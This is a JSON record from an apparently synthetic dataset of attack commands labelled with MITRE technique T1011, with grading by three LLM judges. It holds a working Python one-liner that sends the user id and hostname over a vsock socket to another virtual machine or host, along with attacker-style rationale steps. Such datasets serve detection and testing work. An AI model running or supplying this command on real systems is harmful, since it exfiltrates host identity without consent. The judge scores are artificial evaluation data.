{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
  "explanation": "Transmits minimal host and user identifiers via AF_VSOCK to CID 4 on a high, uncommon port, avoiding IP-based channels per T1011.",
  "rationale_steps": [
    "Pick vsock to traverse a non-IP transport medium.",
    "Connect to CID 4 using an uncommon port (53211).",
    "Prepare a compact identification payload and send.",
    "Close the socket to end the exchange quickly."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-aa9e2bae",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid semicolon-separated statements, and correct use of socket APIs.",
        "semantic_score": 4,
        "semantic_justification": "It exfiltrates identifiers via AF_VSOCK (a non-IP channel) aligning with the intent to avoid standard network monitoring, though it relies on a vsock-capable Linux/virtualization environment and the T1011 mapping is somewhat indirect.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-09-30T23:48:28.711350Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting parameters, and sending data.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements exfiltration over an alternative network medium (AF_VSOCK) as described in T1011, though it's limited to virtualization environments where VSOCK is available rather than truly separate physical mediums like cellular or Bluetooth.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-09-30T23:48:31.818921Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, uses valid Python syntax for imports, socket operations, string manipulation, and includes balanced quotes and parentheses.",
        "semantic_score": 5,
        "semantic_justification": "The command correctly uses `AF_VSOCK` to establish communication on a non-traditional network medium, precisely aligning with T1011's intent to exfiltrate data via channels distinct from standard IP networks, in this case, between a VM and its host (CID 4).",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-09-30T23:48:40.443054Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.333,
    "llm_average_score": 4.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}